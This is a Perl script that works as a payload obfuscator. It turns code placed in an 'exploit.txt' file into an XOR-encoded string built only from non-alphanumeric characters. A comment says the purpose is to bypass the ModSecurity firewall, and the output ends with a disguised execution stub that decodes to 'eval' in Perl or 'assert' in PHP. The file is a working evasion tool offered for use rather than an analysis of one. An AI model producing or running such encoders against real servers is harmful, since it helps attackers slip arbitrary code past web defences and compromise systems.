#!/usr/bin/perl
#Allowed language is Perl or PHP
my $lang = shift or die("Usage: perl $0 [perl|php]\n");
die("This is not supported\n") if($lang !~ /^(php|perl)$/);
#Hash array with all combinations of non-alphanumeric characters inside the ASCII range to bypass ModSecurity
my %hash = (
		"a" => ["('^'^'?')", "('<'^']')", "('='^'\\\\')", "('>'^'_')", "('_'^'>')", "(':'^'[')", "('?'^'^')", "('['^':')", "(']'^'<')", "('\\\\'^'=')"],
		"b" => ["('^'^'<')", "('<'^'^')", "('='^'_')", "('>'^'\\\\')", "('_'^'=')", "('?'^']')", "('\"'^'\@')", "(']'^'?')", "('\@'^'\"')",  "('\\\\'^'>')"],
		"c" => ["('^'^'=')", "('<'^'_')", "('='^'^')", "('>'^']')", "('_'^'<')", "('?'^'\\\\')", "(']'^'>')", "('\@'^'#')", "('\\\\'^'?')", "('#'^'\@')"],
		"d" => ["('^'^':')", "('_'^';')", "(';'^'_')", "(':'^'^')", "('?'^'[')", "('['^'?')", "('\@'^'\$')", "('\$'^'\@')"],
		"e" => ["('^'^';')", "('>'^'[')", "('_'^':')", "(';'^'^')", "(':'^'_')", "('['^'>')", "('\@'^'%')", "('%'^'\@')"],
		"f" => ["('='^'[')", "(';'^']')", "(':'^'\\\\')", "('['^'=')", "(']'^';')", "('\\\\'^':')"],
		"g" => ["('<'^'[')", "(';'^'\\\\')", "(':'^']')", "('\\''^'\@')", "('['^'<')", "(']'^':')", "('\@'^'\\'')", "('\\\\'^';')"],
		"h" => ["('('^'\@')", "('\@'^'(')"],
		"i" => ["(')'^'\@')", "('\@'^')')"],
		"j" => ["('\@'^'*')", "('*'^'\@')"],
		"k" => ["('\@'^'+')", "('+'^'\@')"],
		"l" => ["(','^'\@')", "('\@'^',')"],
		"m" => ["('-'^'\@')", "('\@'^'-')"],
		"n" => ["('.'^'\@')", "('\@'^'.')"],
		"o" => ["('/'^'\@')", "('\@'^'/')"],
		"p" => ["('^'^'.')", "('_'^'/')", "('-'^']')", "(','^'\\\\')", "('/'^'_')", "('.'^'^')", "('['^'+')", "(']'^'-')", "('\\\\'^',')", "('+'^'[')"],
		"q" => ["('^'^'/')", "('_'^'.')", "('-'^'\\\\')", "(','^']')", "('/'^'^')", "('.'^'_')", "('['^'*')", "(']'^',')", "('*'^'[')", "('\\\\'^'-')"],
		"r" => ["('^'^',')", "('_'^'-')", "('-'^'_')", "(','^'^')", "('/'^']')", "('.'^'\\\\')", "(')'^'[')", "('['^')')", "(']'^'/')", "('\\\\'^'.')"],
		"s" => ["('^'^'-')", "('_'^',')", "('-'^'^')", "(','^'_')", "('/'^'\\\\')", "('.'^']')", "('('^'[')", "('['^'(')", "(']'^'.')", "('\\\\'^'/')"],
		"t" => ["('^'^'*')", "('_'^'+')", "('/'^'[')", "('('^'\\\\')", "(')'^']')", "('['^'/')", "(']'^')')", "('*'^'^')", "('\\\\'^'(')", "('+'^'_')"],
		"u" => ["('^'^'+')", "('_'^'*')", "('.'^'[')", "('('^']')", "(')'^'\\\\')", "('['^'.')", "(']'^'(')", "('*'^'_')", "('\\\\'^')')", "('+'^'^')"],
		"v" => ["('^'^'(')", "('_'^')')", "('-'^'[')", "('('^'^')", "(')'^'_')", "('['^'-')", "(']'^'+')", "('*'^'\\\\')", "('\\\\'^'*')", "('+'^']')"],
		"w" => ["('^'^')')", "('_'^'(')", "(','^'[')", "('('^'_')", "(')'^'^')", "('['^',')", "(']'^'*')", "('*'^']')", "('\\\\'^'+')", "('+'^'\\\\')"],
		"x" => ["('_'^'\\'')", "('\\''^'_')", "('['^'#')", "(']'^'%')", "('\$'^'\\\\')", "('\\\\'^'\$')", "('#'^'[')", "('%'^']')"],
		"y" => ["('^'^'\\'')", "('_'^'&')", "('\\''^'^')", "('\"'^'[')", "('['^'\"')", "(']'^'\$')", "('\$'^']')", "('\\\\'^'%')", , "('%'^'\\\\')"],
		"z" => ["('^'^'\$')", "('_'^'%')", "(':'^'\@')", "('\\''^']')", "(']'^'\\'')", "('\@'^':')", "('\$'^'^')", "('%'^'_')"],

		"A" => ["('~'^'?')", "('<'^'}')", "(':'^'{')", "('?'^'~')", "('{'^':')", "('}'^'<')"],
		"B" => ["('`'^'\"')", "('~'^'<')", "('<'^'~')",  "('?'^'}')", "('\"'^'`')", "('}'^'?')"],
		"C" => ["('`'^'#')", "('~'^'=')", "('='^'~')", "('>'^'}')", "('}'^'>')", "('#'^'`')"],
		"D" => ["('`'^'\$')", "('~'^':')", "(':'^'~')", "('?'^'{')", "('{'^'?')", "('\$'^'`')"],
		"E" => ["('`'^'%')", "('~'^';')", "('>'^'{')", "(';'^'~')", "('{'^'>')", "('%'^'`')"],
		"F" => ["('='^'{')", "(';'^'}')", "('{'^'=')", "('}'^';')"],
		"G" => ["('`'^'\\'')", "('<'^'{')", "(':'^'}')", "('\\''^'`')", "('{'^'<')", "('}'^':')"],
		"H" => ["('`'^'(')", "('('^'`')"],
		"I" => ["('`'^')')", "(')'^'`')"],
		"J" => ["('`'^'*')", "('*'^'`')"],
		"K" => ["('`'^'+')", "('+'^'`')"],
		"L" => ["('`'^',')", "(','^'`')"],
		"M" => ["('`'^'-')", "('-'^'`')"],
		"N" => ["('`'^'.')", "('.'^'`')"],
		"O" => ["('`'^'/')", "('/'^'`')"],
		"P" => ["('~'^'.')", "('-'^'}')", "('.'^'~')", "('{'^'+')", "('}'^'-')", "('+'^'{')"],
		"Q" => ["('~'^'/')", "(','^'}')", "('/'^'~')", "('{'^'*')", "('}'^',')", "('*'^'{')"],
		"R" => ["('~'^',')", "(','^'~')", "('/'^'}')", "(')'^'{')", "('{'^')')", "('}'^'/')"],
		"S" => ["('~'^'-')", "('-'^'~')", "('.'^'}')", "('('^'{')", "('{'^'(')", "('}'^'.')"],
		"T" => ["('~'^'*')", "('/'^'{')", "(')'^'}')", "('{'^'/')", "('}'^')')", "('*'^'~')"],
		"U" => ["('~'^'+')", "('.'^'{')", "('('^'}')", "('{'^'.')", "('}'^'(')", "('+'^'~')"],
		"V" => ["('~'^'(')", "('-'^'{')", "('('^'~')", "('{'^'-')", "('}'^'+')", "('+'^'}')"],
		"W" => ["('~'^')')", "(','^'{')", "(')'^'~')", "('{'^',')", "('}'^'*')", "('*'^'}')"],
		"X" => ["('{'^'#')", "('}'^'%')", "('#'^'{')", "('%'^'}')"],
		"Y" => ["('~'^'\\'')", "('\\''^'~')", "('\"'^'{')", "('{'^'\"')", "('}'^'\$')", "('\$'^'}')"],
		"Z" => ["('`'^':')", "('~'^'\$')", "(':'^'`')", "('\\''^'}')", "('}'^'\\'')", "('\$'^'~')"],

		"1" => ["('['^('\@'^'*'))", "('{'^('`'^'*'))", "(']'^(','^'\@'))", "('}'^('`'^','))", "('\\\\'^('-'^'\@'))", "('_'^('.'^'\@'))", "('^'^('/'^'\@'))", "('~'^('`'^'/'))", "('\@'^('_'^'.'))", "('`'^('~'^'/'))"],
		"2" => ["('['^(')'^'\@'))", "('{'^('`'^')'))", "('^'^(','^'\@'))", "('~'^('`'^','))", "('_'^('-'^'\@'))", "('\\\\'^('.'^'\@'))", "(']'^('/'^'\@'))", "('}'^('`'^'/'))", "('\@'^('_'^'-'))", "('`'^(','^'~'))"],
		"3" => ["('['^('('^'\@'))", "('{'^('`'^'('))", "('_'^(','^'\@'))", "('^'^('-'^'\@'))", "('~'^('`'^'-'))", "(']'^('.'^'\@'))", "('}'^('`'^'.'))", "('\\\\'^('/'^'\@'))", "('\@'^('_'^','))", "('`'^('~'^'-'))"],
		"4" => ["('\\\\'^('('^'\@'))", "(']'^(')'^'\@'))", "('}'^('`'^')'))", "('^'^('\@'^'*'))", "('~'^('`'^'*'))", "('_'^('\@'^'+'))", "('['^('/'^'\@'))", "('{'^('`'^'/'))", "('\@'^('_'^'+'))", "('`'^('~'^'*'))"],
		"5" => ["(']'^('('^'\@'))", "('}'^('`'^'('))", "('\\\\'^(')'^'\@'))", "('_'^('\@'^'*'))", "('^'^('\@'^'+'))", "('~'^('`'^'+'))", "('['^('.'^'\@'))", "('{'^('`'^'.'))", "('\@'^('_'^'*'))", "('`'^('~'^'+'))"],
		"6" => ["('^'^('('^'\@'))", "('~'^('`'^'('))", "('_'^(')'^'\@'))", "('\\\\'^('\@'^'*'))", "(']'^('\@'^'+'))", "('}'^('`'^'+'))", "('['^('-'^'\@'))", "('{'^('`'^'-'))", "('\@'^('_'^')'))", "('`'^('~'^'('))"],
		"7" => ["('_'^('('^'\@'))", "('^'^(')'^'\@'))", "('~'^('`'^')'))", "(']'^('\@'^'*'))", "('}'^('`'^'*'))", "('\\\\'^('\@'^'+'))", "('['^(','^'\@'))", "('{'^('`'^','))", "('\@'^('_'^'('))", "('`'^('~'^')'))"],
		"8" => ["('['^('?'^'\\\\'))", "('{'^('~'^'='))", "('\\\\'^('_'^';'))", "(']'^('_'^':'))", "('}'^(';'^'~'))", "('^'^(';'^']'))", "('~'^(';'^'}'))", "('_'^(';'^'\\\\'))", "('\@'^('_'^'\\''))", "('`'^('{'^'#'))"],
		"9" => ["('['^('\@'^'\"'))", "(']'^('_'^';'))", "('}'^('~'^':'))", "('\\\\'^('_'^':'))", "('_'^(';'^']'))", "('^'^(';'^'\\\\'))", "('~'^(':'^'}'))", "('\@'^('_'^'&'))", "('`'^('~'^'\\''))"],
		"0" => ["('['^('\@'^'+'))", "('{'^('`'^'+'))", "('\\\\'^(','^'\@'))", "(']'^('-'^'\@'))", "('}'^('`'^'-'))", "('^'^('.'^'\@'))", "('~'^('`'^'.'))", "('_'^('/'^'\@'))", "('\@'^('_'^'/'))", "('`'^('-'^'}'))"],

		"|" => ["('\"'^'^')", "('\@'^'<')", "('<'^'\@')", "(' '^'\\\\')", "('_'^'#')", "('#'^'_')", "('['^'\\'')", "('^'^'\"')", "('\\\\'^' ')"],
		"!" => ["('_'^'~')", "('~'^'_')"],
		"&" => ["('}'^'[')", "('{'^']')", "(']'^'{')", "('['^'}')"],	
	
);
my $str;
#The code to be transformed is located in exploit.txt
open(IN,"<exploit.txt") or die("Place your code in exploit.txt\n");

while(<IN>) {
	$str.=$_;	#Reading the content of the file and appending to $str
}
close(IN);


print '$__=';	#first part of the payload

foreach($str=~/./g) {	#loop through all characters
	my $char = $_;
	if($char =~ /^[a-zA-Z0-9&!|]$/) {	#if character is alphanumeric or &,!,| it is replaced by a bitwise operation
		$size =  @{$hash{$char}};	#search character in hash array
		$pos = int(rand($size));	#pick a random bitwise operation out of the array
		print $hash{$char}[$pos].".";
	} else {
		if($char eq "\\") {
			print "'\\\\'.";	#\ encoded to \\
		} elsif($char eq "'") {
			print "'\\''.";		#' encoded to \'
		} else {
			print "'$char'.";	#character was non-alphanumeric
		}
	}
}
print "'';";	#end of the payload

#Code execution depends on the programming language
if($lang =~ /^perl$/) {
#perl
	print "''=~('(?{'."."('^'^';').('+'^']').('?'^'^').(','^'\@')".".'(\$__)'.'})');";
} else {
#php
	print "\$_=('?'^'^').('/'^'\\\\').('_'^',').('%'^'\@').('\\\\'^'.').('_'^'+');\$_(\$__);";
}